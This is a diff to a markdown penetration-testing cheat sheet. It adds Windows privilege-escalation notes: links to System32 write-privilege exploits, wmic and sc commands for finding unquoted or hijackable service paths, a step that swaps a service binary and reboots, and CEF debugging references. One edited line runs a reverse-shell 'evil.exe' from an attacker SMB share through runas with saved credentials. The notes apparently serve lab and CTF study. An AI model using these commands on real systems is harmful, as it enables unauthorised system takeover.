@@ -199,6 +199,9 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [From Local Admin to System](#from-local-admin-to-system)
     - [TeamViewer](#teamviewer)
     - [Exploiting service through Symbolic Links](#exploiting-service-through-symbolic-links)
+    - [Write privileges](#write-privileges)
+    - [Services running - Autorun](#services-running---autorun)
+    - [CEF Debugging Background](#cef-debugging-background)
   - [Buffer Overflow](#buffer-overflow)
   - [Antivirus Evasion](#antivirus-evasion)
     - [ToDo](#todo)
@@ -4930,7 +4933,7 @@ Also called "Service Binary Hijacking". Exploit insecure file permissions on ser
 
 **Saved Credentials**
 1. Check for any saved credentials `cmdkey /list`
-2. Start a listener on the attacker machine and run the reverse shell executable using `runas` with the admin user's saved credentials: `runas /savecred /user:admin C:\PrivEsc\reverse.exe`
+2. Start a listener on the attacker machine and run the reverse shell executable using `runas` with the admin user's saved credentials: `runas /savecred /user:admin C:\PrivEsc\reverse.exe` or `runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"`
 
 **Search for Configuration Files**
 1. Run the commands: `dir /s *pass* == *.config` and `findstr /si password *.xml *.ini *.txt`
@@ -5079,6 +5082,39 @@ A symbolic link is a file object that points to another file object. The object 
 - create a Mount Point: `./CreateSymlink.exe "C:\xampp\htdocs\logs\request.log" "C:\Users\Administrator\.ssh\id_rsa"`
   - In this way, a script that copies `request.log` will copy `id_rsa` instead
   - see proving-grounds/Symbolic
+
+
+#### <ins>Write privileges</ins>
+
+- If you can write on `C:\Windows\System32\`, try these:
+  - https://github.com/sailay1996/WerTrigger
+  - https://github.com/binderlabs/DirCreate2System
+
+
+
+#### <ins>Services running - Autorun</ins>
+
+- Usa tasklist: `tasklist /svc`
+- `netstat -ano`
+- See non-default services running
+  - `wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"`
+  - note: if in "PathName" you don't see quotation, there might be a Priv Esc
+- See if there are any autorun applications outside the normal paths (like `C:\app`)
+  - `wmic service get name,displayname,pathname,startmode |findstr /i "auto"`
+  - See CVEs for privilege escalation
+  - If there is an insecure folder permission, you could delete the exe that starts and replace it.
+    - Check it with: `sc qc SERVICENAME`
+  - once done, run `shutdown /r`
+- To see the values corresponding to a PID: `tasklist /svc /FI "PID eq 9833"`
+- Other ways to see running services: `Get-Service, wmic.exe, service get name, sc.exe query state= all, net.exe stat, Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\SERVICE`
+
+
+
+#### <ins>CEF Debugging Background</ins>
+- Example: `Directory: C:\Program Files (x86)\Microsoft Visual Studio 10.0\Common7`
+- https://github.com/taviso/cefdebug
+-  https://twitter.com/taviso/status/1182418347759030272
+- See the process: https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html#priv-tushikikatomo--cyork
 
 
 
